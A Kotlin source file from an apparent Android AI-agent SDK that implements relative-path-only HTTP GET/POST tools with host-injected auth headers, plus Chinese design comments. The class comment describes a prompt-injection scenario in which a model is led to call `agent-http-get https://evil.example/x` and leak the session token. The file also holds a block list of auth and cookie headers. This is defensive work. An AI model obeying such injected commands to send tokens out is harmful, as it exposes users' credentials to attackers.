package ai.agentkernel.android.device

import ai.agentkernel.device.CapabilityFailure
import ai.agentkernel.device.CapabilityOrigin
import ai.agentkernel.device.DeviceCapability
import ai.agentkernel.device.okJson
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.ByteArrayOutputStream
import java.nio.charset.CharacterCodingException
import java.nio.charset.CodingErrorAction
import java.util.concurrent.TimeUnit

/**
 * HTTP 调用能力 —— **SDK 自制的命令**（前缀 `agent-`）。
 *
 * ## 为什么要它，而不是让 agent 用 `curl`
 *
 * 设备自带 `curl`（Android 8+ 都有 `/system/bin/curl`），能发请求，但有三个问题：
 * 1. **鉴权 header 得写进命令行** —— token 会出现在转录、日志、shell 历史里；
 * 2. **输出不可控** —— 一次拉 5MB 的 JSON 直接塞进模型上下文；
 * 3. **失败不好归类** —— curl 的退出码分不清「连不上」和「对方返回 500」。
 *
 * 做成能力之后：
 * - **默认 header 由宿主注入**（`Authorization: Bearer …`），agent 不用知道 token，
 *   调相对路径就行（`agent-http-get /api/weather`），token 不进转录；
 * - 响应体**有上限**，超了截断并明确标记；
 * - 状态码、超时、连接失败都转成**说清原因**的错误。
 *
 * ## 安全边界（2026-11-01 修：**只允许相对路径**）
 *
 * 本能力**只接受宿主基地址下的相对路径**；完整 URL（`http(s)://…`、`//host/…`、`file:` 等任何带 scheme 的写法）
 * 一律 [CapabilityFailure] 拒绝。
 *
 * 为什么必须这么严：
 * - 宿主的鉴权头（`Authorization: Bearer <会话 token>`）是宿主**每个请求现取**、由本类注入的；
 * - 只要允许一个完整 URL，一段提示词注入就能让模型写 `agent-http-get https://evil.example/x`
 *   ⇒ **把会话 token 原样送到攻击者的主机**。`--header` 黑名单挡不住这条路 —— 它只管「模型自填的头」，
 *   而 token 是宿主自己加的；
 * - 所以这里不做「跨源少发一个头」，而是**跨源直接不存在**（拒绝整条命令）。
 *   「少发头」会让请求带着 401 回来，模型只会以为接口坏了，看不出这是安全拦截。
 *
 * 同理：**不跟随 HTTP 跳转**（3xx 直接报错）。跳转是把「已经带上鉴权头的请求」导去别的主机的经典手法，
 * 而且 OkHttp 跨主机跳转只剥 `Authorization`，宿主自定义的鉴权头（`X-Api-Key` 之类）照样带过去。
 *
 * 要跨主机取数，请宿主另配一条能力 / 另一个基地址 —— 本类**不做多基地址**。
 *
 * ## 命令
 *
 * ```
 * agent-http-get  <相对路径> [--header "K: V"] [--timeout 15000] [--max-bytes 200000]
 * agent-http-post <相对路径> [--header "K: V"] [--data "{...}"] [--timeout 15000]
 * ```
 *
 * `--max-bytes` 是**响应体字节上限**（默认 200000，硬上限 2 MB）：响应体按块流式读，
 * 到上限就停并标 `truncated:true`，**不会**先把整个响应读进内存。
 */
class AgentHttpCapabilities(
    /**
     * 宿主 API 的基地址（如 `https://host.example/api`）。
     *
     * **唯一允许访问的目标**：能力只接受相对路径，拼到这个基地址上。
     * 留空 = 没法拼 → 所有调用都明确失败（不再有「留空就传完整 URL」那条路，那正是 token 外泄口）。
     */
    private val baseUrlProvider: () -> String = { "" },
    /** 宿主注入的默认请求头（**含鉴权**）。**只发给同源地址**；agent 看不到它们，也不需要知道。 */
    private val defaultHeadersProvider: () -> Map<String, String> = { emptyMap() },
    /** 默认超时（毫秒）。 */
    private val timeoutMs: Long = 15_000L,
    /** 响应体最大字节数；超了截断并标记 `truncated:true`。会被夹到 [HARD_MAX_BYTES] 以内。 */
    private val maxBytes: Int = 200_000,
) {
    /** 固定地址 / 固定头的便捷写法。 */
    constructor(
        baseUrl: String,
        defaultHeaders: Map<String, String> = emptyMap(),
        timeoutMs: Long = 15_000L,
        maxBytes: Int = 200_000,
    ) : this({ baseUrl }, { defaultHeaders }, timeoutMs, maxBytes)

    private val client: OkHttpClient = OkHttpClient.Builder()
        .callTimeout(timeoutMs, TimeUnit.MILLISECONDS)
        .connectTimeout(timeoutMs, TimeUnit.MILLISECONDS)
        .readTimeout(timeoutMs, TimeUnit.MILLISECONDS)
        // **不跟随跳转**：3xx 会把「已经带上宿主鉴权头的请求」导去别的主机。
        // OkHttp 跨主机只剥 Authorization，宿主自定义的鉴权头（X-Api-Key 之类）照样带过去
        // ⇒ 干脆一跳都不跟，3xx 由 perform() 翻译成明确错误。
        .followRedirects(false)
        .followSslRedirects(false)
        .build()

    val capabilities: List<DeviceCapability> = listOf(
        HttpGetCapability(
            client, baseUrlProvider, defaultHeadersProvider, timeoutMs,
            maxBytes.coerceIn(1, HARD_MAX_BYTES),
        ),
        HttpPostCapability(
            client, baseUrlProvider, defaultHeadersProvider, timeoutMs,
            maxBytes.coerceIn(1, HARD_MAX_BYTES),
        ),
    )
}

/** 解析出来的调用参数。 */
private class HttpArgs(
    val url: String,
    val headers: List<Pair<String, String>>,
    val body: String?,
    val timeoutMs: Long,
    val maxBytes: Int,
)

private fun parseHttpArgs(
    args: List<String>,
    usage: String,
    defaultTimeoutMs: Long,
    defaultMaxBytes: Int,
    allowBody: Boolean,
): HttpArgs {
    var url: String? = null
    var body: String? = null
    var timeout = defaultTimeoutMs
    var maxBytes = defaultMaxBytes
    val headers = mutableListOf<Pair<String, String>>()

    var i = 0
    while (i < args.size) {
        when (val a = args[i]) {
            "--header", "-H" -> {
                val raw = args.getOrNull(i + 1) ?: throw CapabilityFailure("用法：$usage")
                val idx = raw.indexOf(':')
                if (idx <= 0) throw CapabilityFailure("header 要写成 `名称: 值`，收到的是「$raw」")
                val name = raw.substring(0, idx).trim()
                val value = raw.substring(idx + 1).trim()
                checkModelHeaderName(name)
                checkHeaderValue(name, value)
                headers += name to value
                i += 2
            }
            "--data", "-d" -> {
                if (!allowBody) throw CapabilityFailure("用法：$usage")
                body = args.getOrNull(i + 1) ?: throw CapabilityFailure("用法：$usage")
                i += 2
            }
            "--timeout" -> {
                val raw = args.getOrNull(i + 1)
                val value = raw?.toLongOrNull()
                    ?: throw CapabilityFailure("--timeout 要一个整数毫秒数（例如 --timeout 15000）。用法：$usage")
                if (value !in 1..MAX_TIMEOUT_MS) {
                    throw CapabilityFailure("--timeout 要在 1..$MAX_TIMEOUT_MS 毫秒之间（收到 $value）。")
                }
                timeout = value
                i += 2
            }
            "--max-bytes" -> {
                val raw = args.getOrNull(i + 1)
                val value = raw?.toIntOrNull()
                    ?: throw CapabilityFailure("--max-bytes 要一个整数（例如 --max-bytes 200000）。用法：$usage")
                if (value <= 0) {
                    throw CapabilityFailure("--max-bytes 必须大于 0（收到 $value）。")
                }
                if (value > HARD_MAX_BYTES) {
                    throw CapabilityFailure(
                        "--max-bytes 最多 $HARD_MAX_BYTES 字节（2 MB，收到 $value）：" +
                            "再大就只是在考验内存，不是在取数据。要更多请让宿主分批取。",
                    )
                }
                maxBytes = value
                i += 2
            }
            else -> {
                if (a.startsWith("-")) throw CapabilityFailure("不认识的选项「$a」。用法：$usage")
                if (url == null) {
                    url = a
                    i++
                } else {
                    throw CapabilityFailure("用法：$usage")
                }
            }
        }
    }
    val target = url ?: throw CapabilityFailure("用法：$usage")
    return HttpArgs(target, headers, body, timeout, maxBytes)
}

/**
 * header 名字必须是合法的 HTTP token（不能有空格、冒号、中文）。
 *
 * **提前校验**，别把 OkHttp 的原始异常抛给模型 ——
 * `Unexpected char 0x53e6 at 0 in X-Tenant value` 这种话模型看不懂，也不知道该改什么。
 */
/** 只用于**模型输入**的 header 名校验：通用规则 + 敏感头黑名单（宿主注入的不走这里）。 */
private fun checkModelHeaderName(name: String) {
    if (name.lowercase() in FORBIDDEN_REQUEST_HEADERS) {
        throw CapabilityFailure(
            "header「$name」由宿主注入，不要自己传；" +
                "调相对路径（如 agent-http-get /api/weather）会自动带上鉴权。",
        )
    }
    checkHeaderName(name)
}

private fun checkHeaderName(name: String) {
    if (name.isEmpty()) throw CapabilityFailure("header 名字不能为空")
    val bad = name.firstOrNull { it.code !in 0x21..0x7E || it == ':' }
    if (bad != null) {
        throw CapabilityFailure(
            "header 名字「$name」含非法字符。header 名字只能有可打印 ASCII 字母数字和 -_. " +
                "要传中文内容请放到请求体（--data）里。"
        )
    }
}

/**
 * header **值**只能是可打印 ASCII（外加 TAB）。
 *
 * 这条规则是**量出来的**，不是照 RFC 背的：实测 OkHttp 4.12 的行为是
 * - 空格（0x20）**允许** —— `Authorization: Bearer xxx` 这种每天都在用；
 * - TAB（0x09）允许；
 * - ≥0x7F 的非 ASCII（中文等）**拒绝**，报 `Unexpected char 0x… at … in X value`。
 *
 * 所以这里用**和 OkHttp 一样的判据**提前拦下来并说清怎么绕，
 * 而不是把 OkHttp 的原始异常抛给模型（那句 `Unexpected char 0x53e6` 模型看不懂，
 * 也不知道该改成什么）。
 */
private fun checkHeaderValue(name: String, value: String) {
    val bad = value.firstOrNull { (it.code < 0x20 && it.code != 0x09) || it.code >= 0x7F }
    if (bad != null) {
        throw CapabilityFailure(
            "header「$name」的值含非 ASCII 字符 —— HTTP 头按 RFC 只能放可打印 ASCII。" +
                "中文内容请改放到请求体（--data）里；确实要放中文头值的话，" +
                "自己写成百分号编码（例如 %E5%8D%8E%E4%B8%9C 形式），服务端按 URL 解码。"
        )
    }
}

/**
 * 把**相对路径**拼到基地址上。完整 URL 一律拒绝（见类注释「安全边界」）。
 *
 * 判定「像绝对地址」的三类写法（都不允许）：
 * - 带 scheme：`http:` / `https:` / `file:` / `javascript:` …（正则只看开头，`/a:b` 这种路径里的冒号不受影响）；
 * - 协议相对：`//evil.example/x`（浏览器语义里这就是跨主机）；
 * - Windows UNC：`\\evil\share`（模型偶尔会这么写）。
 */
private fun resolveTarget(base: String, target: String): String {
    val raw = target.trim()
    if (raw.isEmpty()) throw CapabilityFailure("要调哪个路径？例如 /api/weather。")
    if (looksAbsolute(raw)) {
        throw CapabilityFailure(
            "只能调本站的相对路径（例如 /api/weather），不能传完整 URL「$raw」。" +
                "宿主的鉴权头只发给本站 —— 允许完整 URL 就等于允许把会话 token 送到任意主机；" +
                "要跨主机取数，请宿主另配一条能力（本能力只服务一个基地址）。",
        )
    }
    if (base.isBlank()) {
        throw CapabilityFailure(
            "「$raw」是相对路径，但本环境没有配基地址（baseUrl）—— " +
                "本能力只允许调宿主配的基地址下的相对路径，不再接受完整 URL。",
        )
    }
    val trimmedBase = base.trim().trimEnd('/')
    return if (raw.startsWith("/")) "$trimmedBase$raw" else "$trimmedBase/$raw"
}

/** 像不像绝对地址（见 [resolveTarget] 的三类写法）。 */
private fun looksAbsolute(raw: String): Boolean =
    raw.startsWith("//") || raw.startsWith("\\\\") || ABSOLUTE_URL_PATTERN.matches(raw)

/** `http:` / `https:` / `file:` …… 任何 scheme 开头都算绝对地址。 */
private val ABSOLUTE_URL_PATTERN = Regex("^[A-Za-z][A-Za-z0-9+.\\-]*:.*")

/**
 * 两个 URL 是不是**同源**（scheme + host + port 全等；端口用 OkHttp 归一化后的默认值比较）。
 *
 * 用 `HttpUrl` 归一化而不是自己切字符串：`HTTPS://Host.Example:443` 与 `https://host.example`
 * 必须算同一个源，否则会出现「看起来在调自己的接口，实际一个鉴权头都不带」的假故障。
 */
internal fun isSameOrigin(a: String, b: String): Boolean {
    val ua = a.toHttpUrlOrNull() ?: return false
    val ub = b.toHttpUrlOrNull() ?: return false
    return ua.scheme == ub.scheme && ua.host == ub.host && ua.port == ub.port
}

private fun perform(
    client: OkHttpClient,
    method: String,
    baseUrl: String,
    url: String,
    headers: List<Pair<String, String>>,
    defaultHeaders: Map<String, String>,
    body: String?,
    timeoutMs: Long,
    maxBytes: Int,
): String {
    // **同源才注入宿主鉴权头**；不同源不是「少发一个头」，而是整条请求拒绝。
    // 少发头的话，请求会带着 401 回来，模型只会以为接口坏了 —— 看不出这是安全拦截。
    if (!isSameOrigin(baseUrl, url)) {
        throw CapabilityFailure(
            "拒绝执行：目标地址（$url）与宿主基地址（$baseUrl）不是同一个源。" +
                "宿主的鉴权头只发给同源地址；要跨主机取数，请宿主另配一条能力。",
        )
    }

    val builder = Request.Builder().url(url)
    // 宿主注入的默认 header 先放，随后 agent 指定的同名 header 覆盖它。
    defaultHeaders.forEach { (k, v) ->
        checkHeaderName(k)
        checkHeaderValue(k, v)
        builder.header(k, v)
    }
    headers.forEach { (k, v) -> builder.header(k, v) }

    when (method) {
        "GET" -> builder.get()
        "POST" -> builder.post(
            (body ?: "").toRequestBody("application/json; charset=utf-8".toMediaType())
        )
    }

    val started = System.currentTimeMillis()
    val scoped = client.newBuilder()
        .callTimeout(timeoutMs, TimeUnit.MILLISECONDS)
        .connectTimeout(timeoutMs, TimeUnit.MILLISECONDS)
        .readTimeout(timeoutMs, TimeUnit.MILLISECONDS)
        .build()

    val response = try {
        scoped.newCall(builder.build()).execute()
    } catch (e: Exception) {
        throw CapabilityFailure(explainFailure(method, url, e))
    }

    response.use { resp ->
        val read = readBodyCapped(resp, maxBytes)
        val elapsed = System.currentTimeMillis() - started

        // 3xx：**不跟随**（客户端已关掉 followRedirects）。跳转目标由对面控制，
        // 跟过去就等于把已经带上宿主鉴权头的请求交给另一台主机。
        if (resp.code in 300..399) {
            throw CapabilityFailure(
                "对方要求跳转（HTTP ${resp.code} → ${resp.header("Location") ?: "（没给 Location）"}）。" +
                    "本能力**不跟随跳转**：跳转会把已带宿主鉴权头的请求带去别的主机。" +
                    "请直接调最终地址（由宿主把基地址改成最终地址）。",
            )
        }

        if (!resp.isSuccessful) {
            // 非 2xx：请求本身成功了，但**这次取数据失败了** —— 明确报错，带上状态码和响应片段。
            throw CapabilityFailure(
                "HTTP ${resp.code} ${resp.message}（$method $url）：${read.text.take(500)}"
            )
        }

        // 响应头先在 okJson 外面拼好 —— 嵌进去会出现两个隐式接收者（JsonObjectBuilder 打架）。
        val headersJson = buildJsonArray {
            resp.headers.names().forEach { name ->
                add(
                    buildJsonObject {
                        put("name", name)
                        put("value", resp.headers[name] ?: "")
                    }
                )
            }
        }

        return okJson {
            put("status", resp.code)
            put("content_type", resp.body?.contentType()?.toString() ?: "")
            // bytes 现在是**真的字节数**（旧实现是 String.length，中文会算少）。
            put("bytes", read.bytes)
            put("truncated", read.truncated)
            put("elapsed_ms", elapsed)
            put("body", read.text)
            put("headers", headersJson)
        }
    }
}

/** 响应体读取结果：解码后的文本 + 实际读到的**字节数** + 是否因为到上限而被截断。 */
private class BodyRead(val text: String, val bytes: Int, val truncated: Boolean)

/**
 * **流式**读响应体，最多 [maxBytes] 字节。
 *
 * 旧写法 `resp.body.string()` 会先把整个响应读进内存，再 `take(maxBytes)` ——
 * 对面给 500 MB，手机就先吃掉 500 MB，然后才说「截断」。现在按 8 KiB 块读，
 * 到上限立刻停（关流即取消剩余下载）。
 *
 * 截断处按 **UTF-8 边界**回收：否则最后一个汉字的字节被切一半，解码出 `�`，
 * 模型会以为接口返回了坏数据。
 */
private fun readBodyCapped(resp: Response, maxBytes: Int): BodyRead {
    val body = resp.body ?: return BodyRead("", 0, false)
    val out = ByteArrayOutputStream(minOf(maxBytes, READ_CHUNK * 2))
    val buf = ByteArray(READ_CHUNK)
    var truncated = false
    body.byteStream().use { input ->
        while (true) {
            val n = input.read(buf)
            if (n < 0) break
            val room = maxBytes - out.size()
            if (n > room) {
                if (room > 0) out.write(buf, 0, room)
                truncated = true
                break
            }
            out.write(buf, 0, n)
        }
    }
    var bytes = out.toByteArray()
    if (truncated) bytes = trimToUtf8Boundary(bytes)
    return BodyRead(String(bytes, Charsets.UTF_8), bytes.size, truncated)
}

/**
 * 把截断处回退到 UTF-8 字符边界（最多退 3 个字节）。
 *
 * 退不掉就说明正文本身不是合法 UTF-8（二进制/别的编码）—— 这时**不要**把整段吞掉，
 * 退回宽松解码（最多带一个替换符），比返回空正文诚实。
 */
private fun trimToUtf8Boundary(bytes: ByteArray): ByteArray {
    val decoder = Charsets.UTF_8.newDecoder()
        .onMalformedInput(CodingErrorAction.REPORT)
        .onUnmappableCharacter(CodingErrorAction.REPORT)
    var end = bytes.size
    repeat(4) {
        if (end <= 0) return ByteArray(0)
        decoder.reset()
        try {
            decoder.decode(java.nio.ByteBuffer.wrap(bytes, 0, end))
            return if (end == bytes.size) bytes else bytes.copyOf(end)
        } catch (e: CharacterCodingException) {
            end--
        }
    }
    return bytes.copyOf(end)
}

/**
 * 把 OkHttp 的异常翻译成**模型能照做**的话。
 *
 * 最常见的一个坑：Android 9（API 28）起默认**禁止明文 HTTP**，
 * OkHttp 抛的是 `CLEARTEXT communication to xxx not permitted by network security policy`。
 * 这句话模型看不懂、也不知道该改哪儿，所以这里翻译成「宿主要配 networkSecurityConfig，或改用 https」。
 */
private fun explainFailure(method: String, url: String, e: Exception): String {
    val raw = e.message ?: e::class.java.simpleName
    return if (raw.contains("CLEARTEXT communication")) {
        "明文 HTTP 被 Android 的网络安全策略拒绝了（$url）。" +
            "这是**宿主 App** 的配置问题，不是命令写错了：宿主要在 AndroidManifest.xml 里配 " +
            "android:networkSecurityConfig（放行明文域名），或者让接口提供 https。"
    } else if (raw.contains("Unable to resolve host")) {
        "解析不了域名（$url）。检查网络/DNS，或确认这台设备能不能访问该地址。"
    } else if (raw.contains("timeout") || raw.contains("timed out")) {
        "请求超时（$method $url）。设备可能不在能访问该地址的网络里（WiFi/移动数据）。"
    } else {
        "请求失败（$method $url）：$raw"
    }
}

/** `agent-http-get`。 */
private class HttpGetCapability(
    private val client: OkHttpClient,
    private val baseUrlProvider: () -> String,
    private val defaultHeadersProvider: () -> Map<String, String>,
    private val defaultTimeoutMs: Long,
    private val defaultMaxBytes: Int,
) : DeviceCapability {
    override val name: String = "http-get"
    override val origin: CapabilityOrigin = CapabilityOrigin.INTERNAL
    override val usage: String = "agent-http-get <相对路径> [--header \"K: V\"] [--timeout 15000] [--max-bytes 200000]"

    override fun run(args: List<String>): String {
        val parsed = parseHttpArgs(args, usage, defaultTimeoutMs, defaultMaxBytes, allowBody = false)
        val baseUrl = baseUrlProvider()
        val url = resolveTarget(baseUrl, parsed.url)
        return runBlocking {
            perform(
                client, "GET", baseUrl, url, parsed.headers, defaultHeadersProvider(), null,
                parsed.timeoutMs, parsed.maxBytes,
            )
        }
    }
}

/** `agent-http-post`。 */
private class HttpPostCapability(
    private val client: OkHttpClient,
    private val baseUrlProvider: () -> String,
    private val defaultHeadersProvider: () -> Map<String, String>,
    private val defaultTimeoutMs: Long,
    private val defaultMaxBytes: Int,
) : DeviceCapability {
    override val name: String = "http-post"
    override val origin: CapabilityOrigin = CapabilityOrigin.INTERNAL
    override val usage: String = "agent-http-post <相对路径> [--header \"K: V\"] [--data \"{...}\"]"

    override fun run(args: List<String>): String {
        val parsed = parseHttpArgs(args, usage, defaultTimeoutMs, defaultMaxBytes, allowBody = true)
        val baseUrl = baseUrlProvider()
        val url = resolveTarget(baseUrl, parsed.url)
        return runBlocking {
            perform(
                client, "POST", baseUrl, url, parsed.headers, defaultHeadersProvider(), parsed.body,
                parsed.timeoutMs, parsed.maxBytes,
            )
        }
    }
}


/**
 * 模型**不许**自己设置的请求头：这些由宿主注入，模型传了只会把鉴权搞坏。
 * （大小写不敏感比较，见 checkHeaderName。）
 */
internal val FORBIDDEN_REQUEST_HEADERS: Set<String> = setOf(
    "authorization",
    "proxy-authorization",
    "cookie",
    "set-cookie",
)

/** 响应体硬上限：2 MB。超过就中断读取（不读进内存）并标 `truncated:true`。 */
private const val HARD_MAX_BYTES = 2 * 1024 * 1024

/** `--timeout` 上限（毫秒）：一次工具调用不该挂几分钟。 */
private const val MAX_TIMEOUT_MS = 120_000L

/** 流式读取的块大小。 */
private const val READ_CHUNK = 8 * 1024
